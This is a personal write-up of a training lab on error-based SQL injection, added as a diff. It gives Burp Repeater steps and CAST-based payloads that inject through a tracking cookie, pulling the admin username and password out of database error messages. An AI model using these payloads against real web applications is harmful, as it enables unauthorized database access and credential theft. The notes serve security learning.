@@ -1,0 +1,73 @@
+Lab 18 - Visible error-based SQL injection
+
+Eng Goal: Exploit SQL injection to retrieve the admin user's credentials from the users table and log in to their account.
+
+Analysis:
+
+1. Find out which field is vulnerable
+
+Go on Burp Suite, send a request to Repeater.
+Add a single quote ' to the cookie trackingId field.
+
+Original:
+Cookie: TrackingId=luHTlTEtowp5nQo1; session=8nFNIZy953oKzugMiAPBad16eD90PfmJ
+-> 200 response
+
+With single quote:
+Cookie: TrackingId=luHTlTEtowp5nQo1'; session=8nFNIZy953oKzugMiAPBad16eD90PfmJ
+-> 500 response error
+
+--> the cookie trackingId field is vulnerable to SQL injection
+
+If we scroll down in the Response tab in Burp Repeater, we also see that there is a verbose error which gives us more information
+-> Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'luHTlTEtowp5nQo1''. Expected  char
+
+Based on that backend error message, we now know that the cookie query is exactly as follows:
+SELECT * FROM tracking WHERE id = 'luHTlTEtowp5nQo1'
+
+SELECT * FROM tracking WHERE id = 'luHTlTEtowp5nQo1'--' -> 200 response
+
+2. Determine the data type of the parameter
+
+NOTE:
+- Since there is no output on the browser, this is technically a blind SQL injection
+- However, the good thing is that it does generate a verbose error in the backend, which we could use to output the admin password into.
+
+We can do this using the CAST() function.
+
+What it does it allows the conversion of one data type to another data type.
+If you compare a data type of one column to another and they are not the same, 
+    an error would be outputted which could be useful to us.
+
+Try the following payload:
+' AND CAST((SELECT 1) AS INT)--
+-> ERROR: argument of AND must be type boolean, not type integer Position: 63
+
+It wants the entire statement to output a boolean... We can do that as follows
+' AND 1=CAST((SELECT 1) AS INT)--
+-> 200 response
+
+3. Get relevant information from the error output
+
+Try to output information from DB:
+' AND 1=CAST((SELECT username FROM users) AS INT)--
+-> Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'luHTlTEtowp5nQo1' AND 
+    1=CAST((SELECT username FROM users) AS'. Expected  char
+--> For some reason, the text after "AS" is cut off. This must mean that the backend is limiting the number of characters allowed in an SQL query.
+
+So, let's try this again, but this time, remove the cookie value and leave it as blank
+-> ERROR: more than one row returned by a subquery used as an expression
+--> New error is good
+
+Since too many rows are returned, we can limit the entry to only 1 username. i.e. compare the number 1 to the selected username.
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT)--
+-> ERROR: invalid input syntax for type integer: "administrator"
+--> Leaked the first user is administrator!!!
+
+4. Get administrator password from the error output
+
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--
+-> ERROR: invalid input syntax for type integer: "6nv5ujht35bkldkhser9"
+--> 6nv5ujht35bkldkhser9
+
+Let's leak the administrator's password
